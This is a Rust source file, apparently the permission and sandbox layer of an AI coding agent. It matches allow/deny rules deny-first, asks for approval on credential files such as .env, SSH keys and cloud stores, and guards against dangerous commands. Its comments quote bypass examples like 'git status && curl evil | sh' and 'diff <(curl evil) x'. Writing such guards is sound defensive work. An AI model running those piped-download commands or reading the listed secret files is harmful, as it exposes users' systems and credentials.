//! wavecode-sandbox — permission and execution-safety layer.
//!
//! Pure logic, 100% unit-testable:
//! - [`PermissionMode`] three modes (a protocol type): plan / guarded / auto
//!   (legacy four-tier names map onto these with a warning at assembly);
//! - allow / deny rule parsing and matching: entries shaped like `Bash(git
//!   *)` or `File(src/**)`, matched **deny-first**, with allow hits skipping
//!   approval;
//! - [`Sandbox::decide`]: given a tool name + input + tool attributes
//!   (read-only / destructive) -> [`Verdict::Allow`] / [`Verdict::Ask`] /
//!   [`Verdict::Deny`].
//!
//! OS-level sandboxing is orthogonal to permission modes: mechanism
//! separated from policy. The platform backend is picked by probing in
//! a fixed order (bwrap, landlock, seatbelt, Windows job object; see
//! [`chain`]), and a missing backend degrades rather than fails.
//!
//! ## Threat model: what this crate enforces (and what it does not)
//!
//! Enforced here or at the wired seams:
//! - Policy verdicts: [`Sandbox::decide`] maps every tool call to
//!   [`Verdict::Allow`] / [`Verdict::Ask`] / [`Verdict::Deny`] from the
//!   permission mode plus allow/deny rules; denials return before execution.
//! - Path confinement: file tools resolve through the tools-crate path
//!   guard, so relative paths cannot escape the session working directory.
//! - Secret scrubbing: the shell tool strips `deny_env` names (the assembled
//!   provider key) plus sensitive-shape environment variables before spawn.
//! - Human approvals: `Ask` verdicts park on the approval gate and execute
//!   only on an explicit grant; headless sessions deny openly.
//!
//! Explicitly NOT provided: no containers or VMs, no syscall filtering.
//! OS isolation is opt-in per spawn through the backend chain (Linux bwrap,
//! then Landlock; macOS seatbelt; Windows a partial Job-Object backend —
//! process-tree lifetime control plus limits only, no filesystem or network
//! boundary): a command that policy allows runs under the first available
//! backend, or is refused when `WAVECODE_SANDBOX_OS` is on and nothing is
//! available.
//! Without confinement a spawned process runs with the user's own OS
//! privileges — treat the policy gate as intent ruling, and the backend
//! chain as the containment boundary only where it reports availability.
//!
//! Future seam: OS enforcement plugs in behind verdict execution without
//! changing policy — the composition-root policy adapter consumes
//! [`Verdict`] today, and a backend would enforce the same verdicts with
//! OS primitives while [`Sandbox::decide`] keeps ruling on intent.

use std::sync::{Arc, Mutex};

use wavecode_protocol::{ApprovalKind, PermissionMode, ToolKind};

pub mod bash;
pub mod bwrap;
pub mod chain;
pub mod os;
mod risk;
pub mod seatbelt;
pub mod windows;
pub use bwrap::BwrapBackend;
pub use chain::{PROBE_ORDER, first_available, status_line, unavailable};

/// Whether OS-level confinement was requested: `WAVECODE_SANDBOX_OS=1`
/// (or `true`, case-insensitive). Default off; the environment variable is
/// the only switch. Every model-facing spawn path asks this before
/// spawning, and a requested confinement that cannot be armed fails
/// closed — execution never silently downgrades to an unconfined child.
pub fn os_sandbox_enabled() -> bool {
    std::env::var("WAVECODE_SANDBOX_OS").is_ok_and(|v| v == "1" || v.eq_ignore_ascii_case("true"))
}
#[cfg(target_os = "linux")]
pub use os::LinuxLandlockBackend;
pub use os::{
    ArmedSpawn, ConfinementProfile, EnforcementLevel, SandboxBackend, SandboxError,
    UnavailableBackend, detect_backend,
};
pub use seatbelt::SeatbeltBackend;
pub use windows::{JOB_STATUS_GAP, WINDOWS_UNAVAILABLE_REASON, WindowsJobBackend};

/// Unified lock-poisoning recovery policy (single decision point for this
/// crate): the mode lock's critical section is a single read / write, so a
/// panic while holding the lock leaves no half-written invariant — recover the
/// guard from the poison and carry on (the panic already propagated on its own
/// thread), never cascade into a second panic.
fn lock<T>(m: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// Character cap for Ask details (ApprovalRequested.detail): a command in full
/// can be very long, and event payloads must stay bounded; the frontend
/// truncates separately when rendering.
/// Hard cap for one approval detail payload; large enough for the
/// multi-line diff of a file-write approval after line budgeting.
/// Mirrors `infrastructure_base::APPROVAL_DETAIL_TRUNCATION` (the wire-side
/// budget the composition root re-truncates with): the two budgets are the
/// same 2000-char contract on the sandbox side and the wire side, pinned
/// byte-equal by the composition root's policy-adapter test (no dependency
/// edge exists between the crates).
pub const DETAIL_MAX_CHARS: usize = 2000;

/// Rule scope (the entry prefix): `Bash(...)` matches the full command,
/// `File(...)` matches the path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleScope {
    Bash,
    File,
}

impl RuleScope {
    fn name(&self) -> &'static str {
        match self {
            Self::Bash => "Bash",
            Self::File => "File",
        }
    }
}

/// One permission rule: a scope plus a pattern (e.g. `Bash(git *)`,
/// `File(src/**)`).
///
/// Two matching semantics: `exact = false` (config-file rules) uses the
/// home-grown wildcard — `*` matches any character run (including `/` and the
/// empty string, i.e. no distinction between `*` and `**`), `?` matches one
/// character, everything else is literal; `exact = true` ("always allow"-
/// derived session rules) compares literally — an approved command holding
/// `*` / `?` never degrades into a wildcard-widened allow surface.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rule {
    scope: RuleScope,
    pattern: String,
    exact: bool,
}

/// Rule parse errors.
#[derive(Debug, thiserror::Error)]
pub enum RuleError {
    /// Malformed entry: must be `Scope(pattern)` with Scope in {Bash, File}
    /// and a non-empty pattern.
    #[error("invalid permission rule: {0} (expected e.g. Bash(git *) or File(src/**))")]
    Invalid(String),
}

impl Rule {
    /// Parse a rule entry: `Scope(pattern)` with Scope in {`Bash`, `File`} and
    /// a non-empty pattern. Surrounding whitespace around the entry is ignored
    /// (config lists often carry it); whitespace inside the parentheses is part
    /// of the pattern and preserved.
    pub fn parse(entry: &str) -> Result<Self, RuleError> {
        let entry = entry.trim();
        let invalid = || RuleError::Invalid(entry.to_owned());
        let open = entry.find('(').ok_or_else(invalid)?;
        let pattern = entry
            .strip_suffix(')')
            .ok_or_else(invalid)?
            .get(open + 1..)
            .ok_or_else(invalid)?;
        let scope = match &entry[..open] {
            "Bash" => RuleScope::Bash,
            "File" => RuleScope::File,
            _ => return Err(invalid()),
        };
        if pattern.is_empty() {
            return Err(invalid());
        }
        Ok(Self {
            scope,
            pattern: pattern.to_owned(),
            exact: false,
        })
    }

    /// Exact-match rules (session-level rules derived from "always allow", see
    /// [`Sandbox::allow_always`]): compare literally, no wildcards.
    pub fn exact(scope: RuleScope, pattern: impl Into<String>) -> Self {
        Self {
            scope,
            pattern: pattern.into(),
            exact: true,
        }
    }

    /// Rule scope (`Bash` matches `command`, `File` matches `path`).
    pub fn scope(&self) -> RuleScope {
        self.scope
    }

    /// Raw match pattern (wildcard unless built via [`Rule::exact`]).
    pub fn pattern(&self) -> &str {
        &self.pattern
    }

    /// Whether the rule compares literally instead of wildcard matching.
    pub fn is_exact(&self) -> bool {
        self.exact
    }

    /// Whether the rule hits this call: take the candidate text from the input
    /// by scope (Bash <- `command`, File <- `path`); a missing candidate never
    /// matches.
    fn matches(&self, input: &serde_json::Value) -> bool {
        let key = match self.scope {
            RuleScope::Bash => "command",
            RuleScope::File => "path",
        };
        input
            .get(key)
            .and_then(serde_json::Value::as_str)
            .is_some_and(|candidate| self.matches_text(candidate))
    }

    /// Per-segment matching for compound commands (Bash scope only): when a
    /// command holds shell separators, a wildcard rule may hit past a
    /// separator — `Bash(curl *)` must refuse `echo hi\ncurl http://evil`
    /// rather than be fooled by the prefix disguise.
    ///
    /// Segments come from the AST ([`bash::parsed_command_segments`]) when the
    /// parse is trustworthy (quoting-aware: no phantom commands from quoted
    /// separators, command names extracted from behind env prefixes), and from
    /// string segmentation otherwise — the fallback keeps deny coverage at
    /// least at the pre-parser level.
    fn matches_any_segment(&self, input: &serde_json::Value) -> bool {
        if self.scope != RuleScope::Bash {
            return false;
        }
        input
            .get("command")
            .and_then(serde_json::Value::as_str)
            .is_some_and(|command| {
                command_segments(command)
                    .iter()
                    .any(|segment| self.matches_text(segment))
            })
    }

    fn matches_text(&self, candidate: &str) -> bool {
        // File-scope comparison runs on lexically normalized text on both
        // sides (see [`normalize_path_text`]): a `..`-spelled path is judged
        // by the location it names, so a deny rule cannot be dodged by a
        // `x/../protected/y` disguise and an allow rule cannot reach past
        // its own prefix. Normalizing the pattern too keeps mixed-separator
        // and `//`-leading config spellings matching what they matched
        // before (normalization is idempotent).
        if self.scope == RuleScope::File {
            let candidate = normalize_path_text(candidate);
            let pattern = normalize_path_text(&self.pattern);
            if self.exact {
                pattern == candidate
            } else {
                wildcard_match(&pattern, &candidate)
            }
        } else if self.exact {
            self.pattern == candidate
        } else {
            wildcard_match(&self.pattern, candidate)
        }
    }

    /// Tool binding for allow exemptions: Bash rules exempt only shell-kind
    /// tools, File rules only the file-editing kind. The input keys
    /// (`command` / `path`) are loose sniffing — any MCP-injected tool could
    /// carry same-named keys, and unbound allows would widen the allow surface
    /// (e.g. an MCP tool free-riding on `Bash(git *)`). Deny matching skips
    /// this check: over-broad in that direction is harmless. The class is
    /// the tool's own declarative [`ToolKind`] — never a name match.
    fn scope_allows_tool(&self, kind: ToolKind) -> bool {
        match self.scope {
            RuleScope::Bash => kind == ToolKind::Shell,
            RuleScope::File => kind == ToolKind::FileEdit,
        }
    }

    /// Conservative dead-rule test: true when `ban` provably hits every call
    /// this rule hits, which under deny-first ordering means this rule can
    /// never change a verdict.
    ///
    /// The test is pattern-inclusion via the same matcher (`ban` matching
    /// this rule's own pattern text implies every string this pattern matches
    /// also matches `ban`), so it under-reports rather than over-reports:
    /// callers may miss a dead rule, never flag a live one. Scopes must agree
    /// — a `File` ban cannot shadow a `Bash` rule.
    pub fn is_covered_by(&self, ban: &Rule) -> bool {
        self.scope == ban.scope && ban.matches_text(&self.pattern)
    }
}

/// Segments a command for rule matching: AST extraction when the parse
/// is trustworthy, string segmentation otherwise. The fallback never
/// weakens deny coverage below the pre-parser level.
fn command_segments(command: &str) -> Vec<String> {
    match bash::parsed_command_segments(command) {
        Some(segments) => segments,
        None => split_command_segments(command)
            .into_iter()
            .map(str::to_string)
            .collect(),
    }
}

/// Shell command separators (conservative set): newlines, `;`, pipes, `&`
/// (covering `&&` / backgrounding), backticks, command substitution `$(`,
/// process substitution `<(` / `>(` (bash/zsh executes the commands inside,
/// so deny's `Bash(curl *)` must not be bypassed by `diff <(curl evil) x`) —
/// any of these marks a compound command: a wildcard rule's `*` may span
/// these separators (`git *` hits `git status && curl evil | sh`), and both
/// allow exemptions and deny bans must follow separator semantics (see
/// [`Sandbox::decide`]).
fn is_compound_command(command: &str) -> bool {
    command
        .chars()
        .any(|c| matches!(c, '\n' | '\r' | ';' | '|' | '&' | '`'))
        || command.contains("$(")
        || command.contains("<(")
        || command.contains(">(")
}

/// Split a compound command into segments (cut on the separators above; for
/// rule matching only, not shell lexing). Separators are all ASCII, so byte
/// scanning never cuts inside a multibyte character. A lone `>` / `<`
/// (redirection) is not a separator — its target is a file, not a command;
/// only paired `<(` / `>(` cut (the command inside process substitution stands
/// alone as a segment for matching). Shared with the AST extractor:
/// heredoc body lines are opaque tokens to the grammar, so their text goes
/// through this splitter to keep deny coverage at the pre-parser level.
pub(crate) fn split_command_segments(command: &str) -> Vec<&str> {
    let bytes = command.as_bytes();
    let mut segments = Vec::new();
    let (mut start, mut i) = (0usize, 0usize);
    while i < bytes.len() {
        let split = match bytes[i] {
            b'\n' | b'\r' | b';' | b'|' | b'&' | b'`' => true,
            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => true,
            b'<' | b'>' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => true,
            _ => false,
        };
        if split {
            segments.push(&command[start..i]);
            i += if bytes[i] == b'$' || bytes[i] == b'<' || bytes[i] == b'>' {
                2
            } else {
                1
            };
            start = i;
        } else {
            i += 1;
        }
    }
    segments.push(&command[start..]);
    segments
        .into_iter()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect()
}

impl std::fmt::Display for Rule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}({})", self.scope.name(), self.pattern)
    }
}

/// Best-effort resolution for the step-1.9 check: the raw path string
/// arrives before the tool's own resolution (hook → policy → approval →
/// execute), so a symlink like `notes.txt -> .env` must be judged by its
/// target rather than its spelling. Relative paths are anchored at the
/// process cwd (the common case for a CLI session); a failed canonicalize
/// keeps the raw string so not-yet-created paths still match lexically.
fn resolved_for_sensitive_check(path: &str) -> String {
    let candidate = if std::path::Path::new(path).is_absolute() {
        std::path::PathBuf::from(path)
    } else {
        match std::env::current_dir() {
            Ok(cwd) => cwd.join(path),
            Err(_) => std::path::PathBuf::from(path),
        }
    };
    std::fs::canonicalize(&candidate)
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| path.to_string())
}

/// Model-supplied language-server program, if the call carries one.
///
/// Empty and non-string values are absent: the tool reports those itself,
/// and a missing override keeps the registered (read-only) provider path.
fn server_command_text(input: &serde_json::Value) -> Option<&str> {
    let command = input.get("server_command")?.as_str()?.trim();
    if command.is_empty() {
        None
    } else {
        Some(command)
    }
}

/// Sensitive credential detection for [`Sandbox::decide`] and for content
/// search that would otherwise return secret file bodies without a `path`
/// the policy check can see. Returns a short reason when the path names a
/// file that usually holds secrets.
/// Matched on separators-normalized lowercase: the `.env` family
/// (documentation variants exempt), SSH private-key names with suffix
/// variants, and cloud provider credential stores.
pub fn sensitive_credential_reason(path: &str) -> Option<&'static str> {
    const ENV_REASON: &str = "environment files usually hold secrets";
    const SSH_REASON: &str = "SSH private keys";
    const CLOUD_REASON: &str = "cloud provider credential stores";
    let normalized = path.replace('\\', "/");
    let lower = normalized.to_lowercase();
    let segments: Vec<&str> = lower.split('/').filter(|s| !s.is_empty()).collect();
    let file = *segments.last()?;
    if file == ".env" || file == ".envrc" {
        return Some(ENV_REASON);
    }
    if let Some(rest) = file.strip_prefix(".env.")
        && !matches!(rest, "example" | "sample" | "template")
    {
        return Some(ENV_REASON);
    }
    if file.ends_with(".env") && !matches!(file, "example.env" | "sample.env" | "template.env") {
        // Trailing form: `prod.env`, `secrets.env`, `app.env` — the same
        // secrets, a different naming convention.
        return Some(ENV_REASON);
    }
    for key in ["id_rsa", "id_ed25519", "id_ecdsa"] {
        if file == key
            || file
                .strip_prefix(key)
                .is_some_and(|rest| rest.starts_with(['.', '-', '_']))
        {
            return Some(SSH_REASON);
        }
    }
    if segments.windows(2).any(|w| {
        matches!(
            w,
            [".aws", "credentials"] | [".gcp", "credentials"] | [".config", "gcloud"]
        )
    }) {
        return Some(CLOUD_REASON);
    }
    None
}

/// Lexically normalize a File-scope candidate before rule matching: `.` and
/// empty segments drop, `..` pops the previous segment, both `/` and `\` act
/// as segment separators, and the result is joined with `/`. A `..`-spelled
/// path is then judged by the location it resolves to, not its spelling — a
/// deny rule (`File(secrets/**)`) cannot be dodged by `docs/../secrets/x`,
/// and an allow rule cannot reach past its own prefix (`File(docs/**)` no
/// longer exempts `docs/../src/x`). Leading `..` that pops past the root
/// vanish; such escape attempts are rejected at execution by the path guard,
/// and keeping them unmatched would only narrow coverage.
fn normalize_path_text(path: &str) -> String {
    let mut segments: Vec<&str> = Vec::new();
    for part in path.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                segments.pop();
            }
            other => segments.push(other),
        }
    }
    segments.join("/")
}

/// Wildcard matching: `*` matches any character run (including `/` and the
/// empty string), `?` matches one character, everything else is literal.
/// Iterative with star backtracking — O(n·m) worst case, fine for short rules
/// and candidates.
pub fn wildcard_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let (mut pi, mut ti) = (0, 0);
    let (mut star, mut star_t) = (None, 0);
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some(pi);
            star_t = ti;
            pi += 1;
        } else if let Some(s) = star {
            // Mismatch backtrack: the star eats one more character, retry.
            pi = s + 1;
            star_t += 1;
            ti = star_t;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// Approval verdict (the disposition of one tool call).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Allow (read-only default, rule exemption, acceptEdits file edits,
    /// bypassPermissions).
    Allow,
    /// Needs a human approval: the run loop (`runtime-runner`) emits
    /// `ApprovalRequested` and parks for
    /// the resolution.
    Ask { kind: ApprovalKind, detail: String },
    /// Park an interactive question: the run loop (`runtime-runner`) emits
    /// `QuestionRequested` and the
    /// user's answer becomes the tool result (the tool body never runs).
    Question {
        /// The question text for display.
        question: String,
        /// Numbered answer options; empty when free text is expected.
        options: Vec<String>,
    },
    /// Deny: the reason feeds back to the model as an is_error ToolResult
    /// (deny rules / plan mode).
    Deny { reason: String },
}

/// Session-level permission state: the permission mode plus the allow / deny
/// rule tables.
///
/// The mode and the allow table are shared via `Arc<Mutex<..>>` (a clone
/// shares: actors switch modes mid-turn via [`Sandbox::mode_handle`], and
/// session-level rules appended by "always allow" ([`Sandbox::allow_always`])
/// take effect on every clone's next verdict). Startup rules come from the
/// assembly layer: authored config entries plus grants a previous session
/// persisted, validated one by one and handed over by [`Sandbox::from_rules`].
/// The deny table is a read-only snapshot (never appended mid-session).
#[derive(Debug, Clone)]
pub struct Sandbox {
    mode: Arc<Mutex<PermissionMode>>,
    allow: Arc<Mutex<Vec<Rule>>>,
    deny: Vec<Rule>,
    backend: Arc<dyn SandboxBackend>,
}

impl Sandbox {
    /// Create: parse the allow / deny rule entries, failing the whole thing
    /// on any invalid entry (explicit startup failure, never silent skips —
    /// section 19 forbids silent downgrades).
    pub fn new(mode: PermissionMode, allow: &[String], deny: &[String]) -> Result<Self, RuleError> {
        let parse_all = |entries: &[String]| {
            entries
                .iter()
                .map(|e| Rule::parse(e))
                .collect::<Result<Vec<_>, _>>()
        };
        Ok(Self::from_rules(mode, parse_all(allow)?, parse_all(deny)?))
    }

    /// Create from already-parsed rules: infallible by construction, for
    /// assembly layers that validate entries one at a time (keeping the good
    /// ones and warning about the bad) instead of failing on the first.
    pub fn from_rules(mode: PermissionMode, allow: Vec<Rule>, deny: Vec<Rule>) -> Self {
        Self {
            mode: Arc::new(Mutex::new(mode)),
            allow: Arc::new(Mutex::new(allow)),
            deny,
            backend: detect_backend(),
        }
    }

    /// Shortcut construction with empty rules (tests and default assembly).
    pub fn without_rules(mode: PermissionMode) -> Self {
        Self::new(mode, &[], &[]).expect("empty rule tables cannot fail to parse")
    }

    /// Current permission mode.
    pub fn mode(&self) -> PermissionMode {
        *lock(&self.mode)
    }

    /// Shared mode handle: actors switch modes mid-turn through it (effective
    /// on the next decide).
    pub fn mode_handle(&self) -> Arc<Mutex<PermissionMode>> {
        self.mode.clone()
    }

    /// Attach an OS confinement backend (builder; defaults to
    /// [`detect_backend`]: Linux Landlock, an always-refusing fallback
    /// elsewhere).
    pub fn with_backend(mut self, backend: Arc<dyn SandboxBackend>) -> Self {
        self.backend = backend;
        self
    }

    /// The OS confinement backend shells confine spawns through (see
    /// [`SandboxBackend::spawn_confined`]).
    pub fn backend(&self) -> &Arc<dyn SandboxBackend> {
        &self.backend
    }

    /// Platform backend selection: Linux tries Landlock, every other target
    /// gets the always-refusing fallback (see [`detect_backend`]).
    pub fn detect_backend() -> Arc<dyn SandboxBackend> {
        detect_backend()
    }

    /// "Always allow" (`ApprovalDecision::AllowAlways`): derive one
    /// **literally exact** session-level rule from this call and append it to
    /// the allow table, returning the rule; when the input carries no
    /// derivable candidate text (below) or it is empty, nothing can be
    /// derived and this returns `None` (callers degrade to a one-shot
    /// allow).
    ///
    /// Candidate selection mirrors the rule-matching input keys
    /// (`Rule::matches`): a non-empty `command` derives a Bash-scope
    /// rule (so every shell-kind tool — `shell`, `python`, `node` — can
    /// derive, not just the one literally named "shell"); otherwise a
    /// `path` derives a File-scope rule, matched on the lexically
    /// normalized text (an approved `a/../b` exempts `b` and its own
    /// spelling alike).
    ///
    /// Semantics and bounds:
    /// - In-session table: the rule is appended to the shared allow table and
    ///   dies with the process unless the caller persists it (the composition
    ///   root does, as a literal grant — see `state_persistence::grants`);
    /// - Shared clones: shared via `Arc`, so a clone held by a subagent sees
    ///   the new rule on its next `decide` (matching "always allow" session
    ///   semantics);
    /// - Exact matching: derived rules carry `exact = true` and compare
    ///   literally — an approved command holding `*` / `?` never degrades
    ///   into a wildcard-widened allow surface;
    /// - Scope binding: a derived Bash rule exempts only shell-kind tools
    ///   and a File rule only file-editing tools (`Rule::scope_allows_tool`),
    ///   so a rule derived from a foreign tool's same-named key never
    ///   exempts that tool itself;
    /// - Deny-first is unaffected: `decide` judges deny first, so a
    ///   session-level allow can never exempt an explicit ban.
    pub fn allow_always(&self, _tool: &str, input: &serde_json::Value) -> Option<Rule> {
        let (scope, text) = if let Some(command) = input
            .get("command")
            .and_then(serde_json::Value::as_str)
            .filter(|command| !command.is_empty())
        {
            (RuleScope::Bash, command.to_owned())
        } else {
            // File rules match on the lexically normalized candidate, so
            // the derived rule is stored normalized too (an approved
            // `a/../b` exempts `b` and its own spelling alike).
            (
                RuleScope::File,
                normalize_path_text(input.get("path")?.as_str()?),
            )
        };
        if text.is_empty() {
            return None;
        }
        let rule = Rule::exact(scope, text);
        lock(&self.allow).push(rule.clone());
        Some(rule)
    }

    /// Approval verdict: deny rules first (no mode exempts them) ->
    /// sensitive-credential asks -> dangerous-command asks (non-plan
    /// modes; an exact session allow of the same command still exempts)
    /// -> allow rule exemptions -> in-session state tool exemptions
    /// (`todowrite` needs no approval in any mode) -> the mode's default
    /// policy.
    ///
    /// `tool` / `input` feed rule matching and Ask details; `read_only` /
    /// `destructive` come from the Tool trait (passed in by the composition
    /// root's policy adapter — sandbox
    /// never depends back on tools).
    pub fn decide(
        &self,
        tool: &str,
        input: &serde_json::Value,
        read_only: bool,
        destructive: bool,
        kind: ToolKind,
    ) -> Verdict {
        // 1. Deny first: explicit bans hold in every mode (bypassPermissions
        //    exempts nothing). Both the whole Bash compound command and its
        //    segments match — deny must not fail on a prefix disguise
        //    (`echo hi\ncurl …` does not prefix-match `Bash(curl *)` whole).
        if let Some(rule) = self
            .deny
            .iter()
            .find(|r| r.matches(input) || r.matches_any_segment(input))
        {
            return Verdict::Deny {
                reason: format!("denied by permission rule: {rule}"),
            };
        }
        // LSP tools are declared read-only, but `server_command` is a
        // model-supplied program that spawns before any handshake. Deny
        // rules key on `command`, so judge that string as a shell command
        // too — otherwise `Bash(python *)` never sees the spawn.
        if let Some(command) = server_command_text(input) {
            let as_command = serde_json::json!({ "command": command });
            if let Some(rule) = self
                .deny
                .iter()
                .find(|r| r.matches(&as_command) || r.matches_any_segment(&as_command))
            {
                return Verdict::Deny {
                    reason: format!("denied by permission rule: {rule}"),
                };
            }
        }
        // 1.9 Sensitive credential files always ask (deny rules above
        // still win; exact session allows below still exempt): `.env`
        // files, SSH private keys, and cloud credential stores hold
        // secrets no permission mode should hand out silently — in
        // `wave` mode this ask is the only line of defense against an
        // injected prompt quietly reading them. Shell commands carry the
        // file only inside the command text, which the Bash rules and
        // mode policy govern; this check covers path-carrying tools.
        // The check runs on the resolved target, not the raw string: a
        // committed symlink (`notes.txt -> .env`) would otherwise be
        // judged by its spelling while the tool layer follows the link.
        if kind != ToolKind::Shell
            && let Some(path) = input.get("path").and_then(serde_json::Value::as_str)
        {
            let resolved = resolved_for_sensitive_check(path);
            if let Some(reason) = sensitive_credential_reason(&resolved) {
                // `allow_always` records the approved text normalized the
                // same way `matches_text` normalizes candidates, so the
                // exemption must compare those spellings: on an existing
                // file the resolved path is canonical (on Windows even
                // `\\?\`-prefixed) and would never equal the approved
                // text, turning every "always allow" back into an ask.
                let exact_allows = lock(&self.allow).iter().any(|r| {
                    r.scope == RuleScope::File
                        && r.exact
                        && (r.matches_text(path) || r.matches_text(&resolved))
                });
                if !exact_allows {
                    return Verdict::Ask {
                        kind: ApprovalKind::Write,
                        detail: format!(
                            "{path} looks like a sensitive credential file ({reason}); approve to let the agent access it"
                        ),
                    };
                }
            }
        }
        // 1.95 Dangerous-command guard: a command carrying an inherently
        // destructive construct (block-device writes, filesystem
        // destruction, power control, recursive forced deletes of system
        // roots, downloads piped into shells) asks for approval even when
        // the mode would allow it — in `wave` mode this is the only gate
        // left, so a prompt-injected command cannot wipe the host without
        // a human seeing why. Plan mode skips the guard (its denial below
        // is stricter than any ask), and an exact session rule from a
        // prior "always allow" of this very command still exempts, mirroring
        // step 1.9. Raw-text high-signal tokens cover parse failures.
        if !matches!(self.mode(), PermissionMode::Plan)
            && let Some(command) = input.get("command").and_then(serde_json::Value::as_str)
            && let Some(reason) = risk::dangerous_reason(command)
        {
            let exact_allows = lock(&self.allow)
                .iter()
                .any(|r| r.scope == RuleScope::Bash && r.exact && r.matches_text(command));
            if !exact_allows {
                return Verdict::Ask {
                    kind: ApprovalKind::Exec,
                    detail: format!(
                        "the command was flagged as dangerous ({reason}); approve to run it anyway"
                    ),
                };
            }
        }
        // 2. Allow hits: exempt, allow directly. Allow rules bind to tool
        //    semantics ([`Rule::scope_allows_tool`]) — the input keys are
        //    loose sniffing, and unbound rules would widen the allow surface.
        //    For Bash compound commands only literally exact rules (derived by
        //    allow_always) may exempt — a wildcard `*` spans command
        //    separators and would sweep `git status && curl evil | sh` into
        //    `Bash(git *)`'s allow surface too.
        let compound_bash = input
            .get("command")
            .and_then(serde_json::Value::as_str)
            .is_some_and(is_compound_command);
        if lock(&self.allow)
            .iter()
            .any(|r| (r.exact || !compound_bash) && r.matches(input) && r.scope_allows_tool(kind))
        {
            return Verdict::Allow;
        }
        // 2.45 In-session state tool exemption: todowrite only mutates
        // the in-session todo list — no filesystem changes, no spawned
        // processes — so it allows directly in every mode (matching
        // deepagents' auto-allowed write_todos; maintaining the list in plan
        // mode is inherently planning). Still bound by the deny rules above
        // (explicit bans are never exempted).
        // `plan approve` is the exception to that exemption: approving a
        // proposal is the user's confirmation act, so the model may draft
        // and revise freely but never self-approve — it asks first, in
        // every mode. The action vocabulary ("approve") is owned by the
        // bootstrap plan tool; the table test below locks the pair so a
        // rename there cannot silently drop this carve-out.
        let plan_approve = kind == ToolKind::SessionState
            && input.get("action").and_then(serde_json::Value::as_str) == Some("approve");
        if kind == ToolKind::SessionState && !plan_approve {
            return Verdict::Allow;
        }
        if plan_approve {
            return Verdict::Ask {
                kind: ApprovalKind::Write,
                detail: ask_detail(tool, input),
            };
        }
        // 2.6 Interactive question routing (ask_user): the user's answer
        // becomes the tool result, so route before mode policy — asking a
        // question is read-only work and never parks on an approval gate.
        // Invalid payloads fall through so the tool reports the schema
        // business error itself.
        if is_user_question(tool)
            && let Some(verdict) = question_verdict(input)
        {
            return verdict;
        }
        // 2.7 Model-supplied language-server spawns are command execution
        // even when the tool's static attribute is read-only. Plan mode
        // denies them (its read-only branch below would otherwise allow
        // the spawn). Auto asks. Wave still falls through, after the
        // deny pass above and the dangerous-command ask here.
        if let Some(command) = server_command_text(input) {
            if let Some(reason) = risk::dangerous_reason(command) {
                let exact_allows = lock(&self.allow)
                    .iter()
                    .any(|r| r.scope == RuleScope::Bash && r.exact && r.matches_text(command));
                if !exact_allows {
                    if matches!(self.mode(), PermissionMode::Plan) {
                        return Verdict::Deny {
                            reason: format!(
                                "plan mode: language-server command was flagged as dangerous ({reason})"
                            ),
                        };
                    }
                    return Verdict::Ask {
                        kind: ApprovalKind::Exec,
                        detail: format!(
                            "spawn language server `{command}` was flagged as dangerous ({reason}); approve to run it"
                        ),
                    };
                }
            }
            match self.mode() {
                PermissionMode::Plan => {
                    return Verdict::Deny {
                        reason: format!(
                            "plan mode: spawning `{command}` is command execution, not a read-only lookup"
                        ),
                    };
                }
                PermissionMode::Wave => {}
                _ => {
                    return Verdict::Ask {
                        kind: ApprovalKind::Exec,
                        detail: format!("spawn language server `{command}`"),
                    };
                }
            }
        }
        // 3. Mode default policy (the ask-free phrasing below describes
        //    only this branch; step 1.9's sensitive-file ask happens
        //    earlier — before the mode default policy branch below).
        //    plan: read-only only; everything else denies outright (no
        //    approval requests). auto: read-only tools, file edits, and
        //    other non-exec writes flow through; command execution
        //    (Exec approval kind) and destructive tools ask. wave: allow
        //    (the user denylist rides the deny rules in step 1, so banned
        //    commands never reach this branch).
        match self.mode() {
            PermissionMode::Plan if !read_only || destructive => Verdict::Deny {
                reason: format!(
                    "plan mode: only read-only tools are allowed; `{tool}` was blocked (no changes were made)"
                ),
            },
            PermissionMode::Wave => Verdict::Allow,
            _ if read_only && !destructive => Verdict::Allow,
            _ if kind == ToolKind::FileEdit && !destructive => Verdict::Allow,
            // present only records deliverables in the session manifest —
            // no repo or process side effects, so it never asks.
            _ if kind == ToolKind::Present && !destructive => Verdict::Allow,
            _ => Verdict::Ask {
                kind: approval_kind(kind),
                detail: ask_detail(tool, input),
            },
        }
    }
}

/// Interactive-question tools: the user's answer is the tool result, so
/// they route through the question flow instead of executing.
fn is_user_question(tool: &str) -> bool {
    matches!(tool, "ask_user")
}

/// Extract the question payload for [`Verdict::Question`]: a non-empty
/// trimmed `question` plus up to four non-empty string `options`.
/// `None` means the payload is invalid (the tool then reports the schema
/// business error itself through normal execution).
fn question_verdict(input: &serde_json::Value) -> Option<Verdict> {
    let question = input.get("question")?.as_str()?.trim();
    if question.is_empty() {
        return None;
    }
    let mut options = Vec::new();
    if let Some(items) = input.get("options").and_then(|v| v.as_array()) {
        for item in items {
            let text = item.as_str()?.trim();
            if text.is_empty() {
                return None;
            }
            options.push(text.to_string());
        }
    }
    if options.len() > 4 {
        return None;
    }
    Some(Verdict::Question {
        question: question.to_string(),
        options,
    })
}

/// Approval kind: tools that run arbitrary code (local shells, inline
/// script runtimes, background job spawns) are Exec; everything else
/// (file writes / edits, …) is Write.
fn approval_kind(kind: ToolKind) -> ApprovalKind {
    if kind == ToolKind::Shell {
        ApprovalKind::Exec
    } else {
        ApprovalKind::Write
    }
}

